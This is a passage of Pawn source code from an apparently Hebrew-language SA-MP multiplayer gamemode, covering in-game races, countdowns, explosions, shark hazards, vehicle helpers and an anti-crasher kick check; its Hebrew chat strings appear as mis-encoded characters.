			if(playerinfo[i][cvcolor] && IsPlayerInAnyVehicle(i)) ChangeVehicleColor(GetPlayerVehicleID(i),random(127),random(127));
		 	// Sharks
		 	if(IsPlayerInArea(i,1892.311,1488.726,1993.837,1600.9) && p[2] < 8.4 && GetPlayerState(i) == PLAYER_STATE_ONFOOT && !playerinfo[i][gm]) for(new j = 0; j < sharks; j++)
		 	{
			 	GetSObjectPos(shark[j],op[0],op[1],op[2]);
			 	if(IsPlayerInRangeOfPoint(i,27.0,op[0],op[1],op[2]))
			 	{
					PlaySound(i,1057,op[0],op[1],op[2]);
				 	if(IsPlayerInRangeOfPoint(i,2.5,op[0],op[1],op[2])) Damage(i,10.0);
					StopSObject(shark[j]);
					MoveSObject(shark[j],p[0],p[1],op[2],7.0,0.0,0.0,GetRotToXY(objectinfo[shark[j]][orot][0],objectinfo[shark[j]][orot][1],p[0],p[1]));
					SetObjectToFaceCords(shark[j],p[0],p[1],p[2]);
			 	}
		 	}
			// Player Options
			if(optioneds > 0) for(new ii = 0, s = optioned[0]; ii < optioneds; ii++, s = optioned[ii]) if(IsPlayerConnected(s) && s != INVALID_PLAYER_ID) switch(playerinfo[s][poption])
			{
				case po_cantlook: if(IsPlayerLookingAtPlayer(i,s,3.0)) Damage(i,2.5);
			}
			// Speedometer Update
			if(playerinfo[i][speedo] != INVALID_PLAYER_TEXT_DRAW && playerinfo[i][setting][setting_speedo] && (GetPlayerState(i) == PLAYER_STATE_DRIVER || GetPlayerState(i) == PLAYER_STATE_PASSENGER)) Speedometer(i,"update");
			// WaterWalk
			if(playerinfo[i][waterwalk][0])
			{
				GetPlayerPos(i,p[0],p[1],p[2]);
				SetObjectPos(playerinfo[i][waterwalk][1],p[0],p[1],0.12);
			}
			// New Speed Sync
			if(playerinfo[i][speedup][0] != 0.0 && playerinfo[i][speedup][0] != 1.0) if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
			{
				GetPlayerKeys(i,k[0],k[1],k[2]);
				if(k[0] & 8 || k[0] & 32) MulPlayerVelocity(i,playerinfo[i][speedup][0],playerinfo[i][speedup][1],playerinfo[i][speedup][2]);
			}
			// Enter Message
			if(playerinfo[i][entermessage][0] != -1)
			{
				playerinfo[i][entermessage][1]++;
				if(playerinfo[i][entermessage][1] >= playerinfo[i][entermessage][3]) playerinfo[i][entermessage][0] = -1, playerinfo[i][entermessage][1] = -1;
				else
				{
					strmid(string,WelcomeMessages[playerinfo[i][entermessage][0]],0,playerinfo[i][entermessage][1],playerinfo[i][entermessage][3]);
					SetDynamicObjectMaterialText(playerinfo[i][entermessage][2],0,string,.fontsize = 20,.fontcolor = playerinfo[i][entermessage][4],.backcolor = playerinfo[i][entermessage][5],.textalignment = 1);
				}
			}
			// Reloading Text
			if(playerinfo[i][reloadingt] == 0 && GetPlayerWeaponState(i) == WEAPONSTATE_RELOADING)
			{
				playerinfo[i][reloadingt] = 3;
				TextDrawShowForPlayer(i,reloading);
			}
			else if(playerinfo[i][reloadingt] > 0 && GetPlayerWeaponState(i) != WEAPONSTATE_RELOADING)
			{
				playerinfo[i][reloadingt]--;
				if(!playerinfo[i][reloadingt]) TextDrawHideForPlayer(i,reloading);
			}
		}
	}
	#if lagtest
		LagTest_End("Contents2");
	#endif
	return 1;
}
//=[CanA]=======================================================================
public CanA(playerid,id) return playerinfo[playerid][cana][id] = 1;
//=[CanS]=======================================================================
public CanS(playerid) return playerinfo[playerid][cans] = 1;
//=[CanAFK]=====================================================================
public CanAFK(playerid) return playerinfo[playerid][canafk] = 2;
//=[CanTeleP]===================================================================
public CanTeleP(playerid) return playerinfo[playerid][cantelep] = 1;
//=[CanHitman]==================================================================
public CanHitman(playerid) return playerinfo[playerid][canhitman] = 1;
//=[ResetWarned]================================================================
public ResetWarned(playerid) return playerinfo[playerid][warned] = false;
//=[CanRob]=====================================================================
public CanRob(playerid) return playerinfo[playerid][canrob] = 1;
//=[ResetOption2]===============================================================
public ResetOption2() return Options[2][optActive] = false, 1;
//=[ConnectKick]================================================================
forward ConnectKick(playerid);
public ConnectKick(playerid)
{
	return Kick(playerid);
}
//=[StartSRace]=================================================================
public StartSRace(srid)
{
	if(debugstate) printf("Gamemode Activity [start]: StartSRace");
	#if lagtest
		LagTest_Start("StartSRace");
	#endif
	new string[M_S];
	if(thereIsAct) return 0;
	sraceinfo[0] = 1, sraceinfo[1] = 0, sraceinfo[2] = 60, sraceinfo[4] = 3, sraceinfo[5] = srid;
	sraceinfo[3] = SetTimer("StartSRace2",1000,1);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	format(string,sizeof(string)," !щ·чщь сЄху уўф " @c(yellow) "%s" @c(lightyellow) " ющ°хї ющхчу юёхт",SRaceTypes[sraceinfo[5]][srName]);
	SendClientMessageToAll(lightyellow,string);
	format(string,sizeof(string)," /join рх %s join ьфЎш°Їх· °∙юх р· фЇўхуф",SRaceTypes[sraceinfo[5]][srCommand]);
	SendClientMessageToAll(lightyellow,string);
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьющ°хї Єхьф " #join_act "$ хфЇ°ё ьюўхэ ф°р∙хя фхр " #actprize_srace1 "$");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	format(string,sizeof(string),"~y~~h~%s~n~/join",SRaceTypes[sraceinfo[5]][srName]);
	GameTextForAll(string,6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartSRace");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartSRace");
	return 1;
}
//=[StartSRace2]=================================================================
public StartSRace2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartSRace2");
	#if lagtest
		LagTest_Start("StartSRace2");
	#endif
	new string[M_S], id;
	sraceinfo[2]--;
	if(sraceinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(sraceinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~y~~h~~h~%s: ~h~%d~n~~y~~h~~h~(%d/%d)",SRaceTypes[sraceinfo[5]][srName],sraceinfo[2],sraceinfo[1],CountOfSRaceTypeInArray(SRaceTypes[sraceinfo[5]][srPlace],0));
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(sraceinfo[2] == 15 || sraceinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :щ·чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· %s фющ°хї юёхт",sraceinfo[2],SRaceTypes[sraceinfo[5]][srName]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(sraceinfo[2] == 3)
	{
		if(sraceinfo[1] < 3) return EndSRace("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю3",-1);
		for(new i=0, mx = CountOfSRaceTypeInArray(SRaceTypes[sraceinfo[5]][srPlace],0) + 1;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitsrace])
			{
				id = playerinfo[i][sraceid];
				SetFreeze(i,1);
				ResetWeapons(i);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				#define syncsrace(%1) if(SRaceTypes[sraceinfo[5]][srPlace] == %1) SetPlayerPos(i,SRacePositions_%1[id][srX],SRacePositions_%1[id][srY],SRacePositions_%1[id][srZ]), SetPlayerFacingAngle(i,SRacePositions_%1[id][srA]), SetPlayerRaceCheckpoint(i,0,SRacePositions_%1[mx][srX],SRacePositions_%1[mx][srY],SRacePositions_%1[mx][srZ],SRacePositions_%1[mx+1][srX],SRacePositions_%1[mx+1][srY],SRacePositions_%1[mx+1][srZ],SRaceTypes[sraceinfo[5]][srCPSize])
				syncsrace(1);
				syncsrace(2);
				syncsrace(3);
				syncsrace(4);
				#undef syncsrace
				SetPlayerVirtualWorld(i,world_srace);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetPlayerHealth(i,10000.0);
				SetPlayerArmour(i,0.0);
				SetPlayerInterior(i,0);
				ToggleWaterWalk(i,0);
				SetCameraBehindPlayer(i);
				playerinfo[i][sracecp] = mx;
				if(sraceinfo[5] == 3)
				{
					SendClientMessage(i,orange," :сЇЄщьх· фцх Ў°щъ ьЄхє ьыщххя фюш°х·");
					SendClientMessage(i,orange," ыущ ьЄхє W ф∙·ю∙х сЄыс° ыущ ьЁххш хсчї ьюЄьф рх");
				}
				else SendClientMessage(i,orange," !сфЎьчф сющ°хї");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(sraceinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitsrace])
			{
				playerinfo[i][insrace] = 1, playerinfo[i][waitsrace] = 0;
				SetFreeze(i,0);
				if(sraceinfo[5] == 3)
				{
					StartFlyingC(i);
					playerinfo[i][gm] = 1;
					SetPlayerHealth(i,10000.0);
				}
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщь! юёЇ° фю∙··Їщэ: %d %s фющ°хї фющхчу",sraceinfo[1],SRaceTypes[sraceinfo[5]][srName]);
		SendClientMessageToAll(lightyellow,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(sraceinfo[3]);
	}
	#if lagtest
		LagTest_End("StartSRace2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartSRace2");
	return 1;
}
//=[DestroyPickup2]=============================================================
public DestroyPickup2(pid) return DestroyPickupEx(pid);
//=[Explosion]==================================================================
public Explosion(playerid,bombid,bp1,bp2,bp3)
{
	#if lagtest
		LagTest_Start("Explosion");
	#endif
	new Float:p[3], string[M_S], Float:h, bool:killed=false;
	switch(bombid)
	{
		case 1: CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,15,0);
		case 2:
		{
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+1.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,13,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-1.0,playerinfo[playerid][bombpos][2],7,13,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+1.0,7,13,0);
		}
		case 3: CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,25,0);
		case 4: CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,30,0);
		case 5:
		{
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+20.0,playerinfo[playerid][bombpos][1]+20.0,playerinfo[playerid][bombpos][2]+5.0,7,0.3,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-20.0,playerinfo[playerid][bombpos][1]+20.0,playerinfo[playerid][bombpos][2]+5.0,7,0.3,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+20.0,playerinfo[playerid][bombpos][1]-20.0,playerinfo[playerid][bombpos][2]+5.0,7,0.3,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-20.0,playerinfo[playerid][bombpos][1]-20.0,playerinfo[playerid][bombpos][2]+5.0,7,0.3,0);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,75.0,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2])) PlayAudioStreamForPlayer(playerid,"http://www.wavlist.com/soundfx/009/rooster-1.wav");
		}
		case 6:
		{
			playerinfo[playerid][bombpos][2] += 7.5;
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+50.5,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+30.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-50.5,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-30.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+15.5,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-15.5,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+50.5,playerinfo[playerid][bombpos][1]+15.5,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-50.5,playerinfo[playerid][bombpos][1]+15.5,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+50.5,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-50.5,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+30.0,playerinfo[playerid][bombpos][1]-15.5,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-30.0,playerinfo[playerid][bombpos][1]-15.5,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+30.0,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-30.0,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+100.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+60.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-100.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-60.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+90.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-90.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+100.0,playerinfo[playerid][bombpos][1]+90.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-100.0,playerinfo[playerid][bombpos][1]+90.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+100.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-100.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+60.0,playerinfo[playerid][bombpos][1]-90.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-60.0,playerinfo[playerid][bombpos][1]-90.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]+60.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			CreateExplosionVW(playerinfo[playerid][bombpos][0]-60.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6,0);
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && IsPlayerInCircle(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],100))
				{
					GetPlayerPos(i,p[0],p[1],p[2]);
					switch(GetPlayerDistanceToPointEx(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]))
					{
						case 0..40:
						{
							SetPlayerHealth(i,0.0);
							format(string,sizeof(string)," !%s Ёф°т юЇЎЎ· фршхэ ∙ь %s",GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
						}
						case 41..48, 52..60:
						{
							GetPlayerHealth(i,h);
							killed = h-50.0 <= 0.0? true:false;
							SetPlayerHealth(i,h-50.0 < 0.0? 0.0:h-50.0);
							format(string,sizeof(string),killed? (" !%s Ёф°т юЇЎщЄф ў∙ф юЇЎЎ· фршхэ ∙ь %s"):(" !%s ЁЇЎЄ ў∙ф юЇЎЎ· фршхэ ∙ь %s"),GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
							killed = false;
						}
						case 61..72:
						{
							GetPlayerHealth(i,h);
							killed = h-25.0 <= 0.0? true:false;
							SetPlayerHealth(i,h-25.0 < 0.0? 0.0:h-25.0);
							format(string,sizeof(string),killed? (" !%s Ёф°т юЇЎщЄф сщЁхЁщ· юЇЎЎ· фршхэ ∙ь %s"):(" !%s ЁЇЎЄ сщЁхЁщ юЇЎЎ· фршхэ ∙ь %s"),GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
							killed = false;
						}
						case 49..51, 73..75, 98..100:
						{
							SendClientMessage(i,orange," !Єюу· сЁўху· схЁхё ∙Ёх·Ё· ьъ ьчщх· тэ рч°щ фЇЎЎф: сЁхёє ўщсь· 100$");
							GiveMoney(i,100, 35);
						}
						case 76..97:
						{
							GetPlayerHealth(i,h);
							killed = h-10.0 <= 0.0? true:false;
							SetPlayerHealth(i,h-10.0 < 0.0? 0.0:h-10.0);
							format(string,sizeof(string),killed? (" !%s Ёф°т юЇЎщЄф ўьф юЇЎЎ· фршхэ ∙ь %s"):(" !%s ЁЇЎЄ ўь юЇЎЎ· фршхэ ∙ь %s"),GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
							killed = false;
						}
					}
					if(killed) playerinfo[playerid][bombkills]++;
					playerinfo[playerid][bombdmg]++;
				}
			}
			fsetint(fuser(playerid),"BombKills",playerinfo[playerid][bombkills]);
			fsetint(fuser(playerid),"BombDamages",playerinfo[playerid][bombdmg]);
		}
		case 7:
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && IsPlayerInCircle(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],150))
				{
					format(string,sizeof(string),GetPlayerDistanceToPointEx(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]) <= 50 ? (" !%s ЁЇтЄ юЇЎЎ· фющюя ∙ь %s") : (" !%s ЁЇтЄ юффує ∙ь ЇЎЎ· фющюя ∙ь %s"),GetName(playerid),GetName(i));
					SendClientMessageToAll(red,string);
					playerinfo[playerid][bombdmg]++;
				}
			}
			SetTimerEx("HydrogenBoom",400,0,"fffii",playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],0,GetPlayerVirtualWorld(playerid));
		}
	}
	if(playerinfo[playerid][bomb] != 8) for(new i=0;i<3;i++) playerinfo[playerid][bombpos][i] = 0.0;
	playerinfo[playerid][bomb] = 0;
	if(bp1 != -1) DestroySObject(bp1);
	if(bp2 != -1) DestroySObject(bp2);
	if(bp3 != -1) DestroySObject(bp3);
	#if lagtest
		LagTest_End("Explosion");
	#endif
	return 1;
}
//=[playerCanUseAnim]===========================================================
public playerCanUseAnim(playerid)
{
	if(IsPlayerAFK_(playerid) ||
	playerinfo[playerid][inact] ||
	playerinfo[playerid][reqclass] ||
	playerinfo[playerid][frozen] ||
	playerinfo[playerid][inmarea] != -1) return 0;
	return 1;
}
//=[BattleCD]===================================================================
public BattleCD(playerid,playerid2)
{
	#if lagtest
		LagTest_Start("BattleCD");
	#endif
	if(debugstate) printf("BattleCD(%d,%d) start",playerid,playerid2);
	if(playerinfo[playerid][bcd][0] <= 0)
	{
		KillTimer(playerinfo[playerid][bcd][1]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,"~r~f~h~i~r~g~h~~h~h~r~t~h~~h~~h~!",2000,4);
				HidePlayerDialog(i);
				if(!IsPlayerAFK_(i)) PlaySound(i,1057);
				SetFreeze(i,0);
				playerinfo[i][noend] = 0;
			}
		}
		playerinfo[playerid][bcd][0] = 0;
	}
	else
	{
		new string[10];
		format(string,sizeof(string),"~r~%d",playerinfo[playerid][bcd][0]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,string,2000,4);
				playerinfo[i][bcd][0]--;
			}
		}
	}
	#if lagtest
		LagTest_End("BattleCD");
	#endif
	if(debugstate) printf("BattleCD(%d,%d) end",playerid,playerid2);
	return 1;
}
//=[DriftCD]====================================================================
public DriftCD(playerid,playerid2)
{
	#if lagtest
		LagTest_Start("DriftCD");
	#endif
	if(debugstate) printf("DriftCD(%d,%d) start",playerid,playerid2);
	if(playerinfo[playerid][dcd][0] <= 0)
	{
		KillTimer(playerinfo[playerid][dcd][1]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,"~g~s~h~t~g~a~h~~h~r~g~t~h~~h~~h~!",2000,4);
				if(!IsPlayerAFK_(i)) PlaySound(i,1057);
				SetFreeze(i,0);
				playerinfo[i][noend] = 0;
			}
		}
		playerinfo[playerid][dcd][0] = 0;
	}
	else
	{
		new string[10];
		format(string,sizeof(string),"~g~%d",playerinfo[playerid][dcd][0]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,string,2000,4);
				playerinfo[i][dcd][0]--;
			}
		}
	}
	#if lagtest
		LagTest_End("DriftCD");
	#endif
	if(debugstate) printf("DriftCD(%d,%d) end",playerid,playerid2);
	return 1;
}
//=[RaceCD]=====================================================================
public RaceCD(playerid,playerid2)
{
	#if lagtest
		LagTest_Start("RaceCD");
	#endif
	if(debugstate) printf("RaceCD(%d,%d) start",playerid,playerid2);
	if(playerinfo[playerid][prcd][0] <= 0)
	{
		KillTimer(playerinfo[playerid][prcd][1]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,"~y~s~h~t~y~a~h~~h~r~y~t~h~~h~~h~!",2000,4);
				HidePlayerDialog(i);
				if(!IsPlayerAFK_(i)) PlaySound(i,1057);
				SetFreeze(i,0);
			}
		}
		playerinfo[playerid][prcd][0] = 0;
	}
	else
	{
		new string[10];
		format(string,sizeof(string),"~y~%d",playerinfo[playerid][prcd][0]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,string,2000,4);
				playerinfo[i][prcd][0]--;
			}
		}
	}
	#if lagtest
		LagTest_End("RaceCD");
	#endif
	if(debugstate) printf("RaceCD(%d,%d) end",playerid,playerid2);
	return 1;
}
//=[@receivestring]=============================================================
public @receivestring(const message[], const source[])
{
}
//=[@receivepacket]=============================================================
public @receivepacket(const packet[], size, const source[])
{
}
//=[OnPlayerEditObject]=========================================================
public OnPlayerEditObject(playerid,playerobject,objectid,response,Float:fX,Float:fY,Float:fZ,Float:fRotX,Float:fRotY,Float:fRotZ)
{
	if(playerobject) Streamer_CallbackHook(STREAMER_OPEO,playerid,playerobject,objectid,response,fX,fY,fZ,fRotX,fRotY,fRotZ);
	return 1;
}
//=[OnPlayerSelectObject]=======================================================
public OnPlayerSelectObject(playerid,type,objectid,modelid,Float:fX,Float:fY,Float:fZ)
{
	if(type == SELECT_OBJECT_PLAYER_OBJECT) Streamer_CallbackHook(STREAMER_OPSO,playerid,type,objectid,modelid,fX,fY,fZ);
	return 1;
}
//=[OnPlayerWeaponShot]=========================================================
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(hittype != BULLET_HIT_TYPE_NONE) if(!(-1000.0 <= fX <= 1000.0) || !(-1000.0 <= fY <= 1000.0) || !(-1000.0 <= fZ <= 1000.0)) return AdminInfo(playerid,"Crash Detected?"), 0;
	switch(weaponid)
	{
		case 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38: { }
        default: return SetKick(playerid,INVALID_PLAYER_ID,"Crasher detected"), 0;
    }
	if(hittype == BULLET_HIT_TYPE_PLAYER_OBJECT) Streamer_CallbackHook(STREAMER_OPWS,playerid,weaponid,hittype,hitid,fX,fY,fZ);
	//if(playerinfo[playerid][inmarea] != -1 || (hittype == BULLET_HIT_TYPE_PLAYER && IsPlayerConnected(hitid) && playerinfo[hitid][inmarea] != -1)) return 0;
	return 1;
}
//=[Boomcar]====================================================================
public Boomcar(playerid)
{
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	CreateExplosionVW(p[0],p[1],p[2],7,50,world_normal);
	SetPlayerHealth(playerid,0.0);
	SendClientMessage(playerid,red," .ф·ЇхЎЎ· юфЇЎЎф ∙фхшюЁф с°ыс цф");
	return 1;
}
//=[PutInVehicle]===============================================================
public PutInVehicle(playerid,vehicleid,seat)
{
    PutPlayerInVehicle(playerid,vehicleid,seat);
    if(playerinfo[playerid][vtele3] == 1) DestroyObject(playerinfo[playerid][vehicle][7]),playerinfo[playerid][vtele3] = 0;
 	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) if(!IsPlayerInAnyVehicle(i))
 	{
 	    if(playerinfo[i][vtele3] == 1) DestroyObject(playerinfo[i][vehicle][7]),playerinfo[i][vtele3] = 0;
	}
	return 1;
}
public PutInVehicle3(playerid,vehicleid,seat)
{
    LinkVehicleToInterior(vehicleid, 15);
    if(playerinfo[playerid][vtele3] == 1) DestroyObject(playerinfo[playerid][vehicle][7]),playerinfo[playerid][vtele3] = 0;
    PutPlayerInVehicle(playerid,vehicleid,seat);
    vehicleinfo[vehicleid][vgm] = 1;
    playerinfo[playerid][vtele3] = 1;
    if(GetVehicleModel(vehicleid) == 520)
    {
	    playerinfo[playerid][vehicle][7] = CreateObject(16778,0,0,-1000,0,0,0,100+playerid);
	    return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid, 0.000000,0.000000,-6.699997,0.000000,0.000000,0.000000);
	}
    if(GetVehicleModel(vehicleid) == 487)
    {
		playerinfo[playerid][vehicle][7] = CreateObject(19332,0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 200.0+playerid);
		return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	}
    if(GetVehicleModel(vehicleid) == 443)
    {
	    playerinfo[playerid][vehicle][7] = CreateObject(18248,0,0,-1000,0,0,0,100+playerid);
	    return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid, 4.275001,6.899994,6.374995,359.100280,-0.000001,-186.299880);
	}
    if(GetVehicleModel(vehicleid) == 481)
    {
	    playerinfo[playerid][vehicle][7] = CreateObject(1349,0,0,-1000,0,0,0,100+playerid);
